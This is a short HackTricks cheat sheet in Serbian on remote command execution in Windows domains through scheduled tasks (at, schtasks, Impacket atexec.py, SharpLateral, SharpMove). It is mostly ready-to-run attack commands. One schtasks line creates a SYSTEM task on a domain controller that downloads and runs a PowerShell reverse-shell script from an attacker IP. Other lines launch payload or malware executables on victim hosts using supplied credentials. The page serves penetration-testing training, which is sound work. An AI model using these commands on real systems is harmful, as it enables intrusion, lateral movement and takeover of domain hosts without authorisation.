# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Kako funkcioniše

At omogućava zakazivanje tasks na hostovima za koje znate username/(password/Hash). Tako ga možete koristiti za izvršavanje komandi na drugim hostovima i dobijanje output-a.
```
At \\victim 11:00:00PM shutdown -r
```
Koristeći schtasks, najpre treba da kreirate zadatak, a zatim da ga pozovete:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Možete koristiti **Impacket-ov `atexec.py`** za izvršavanje komandi na udaljenim sistemima pomoću AT komande. Za ovo su potrebni važeći akreditivi (korisničko ime i lozinka ili hash) za ciljni sistem.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Možete koristiti i [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Možete koristiti [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Više informacija o [**korišćenju schtasks sa silver tickets ovde**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
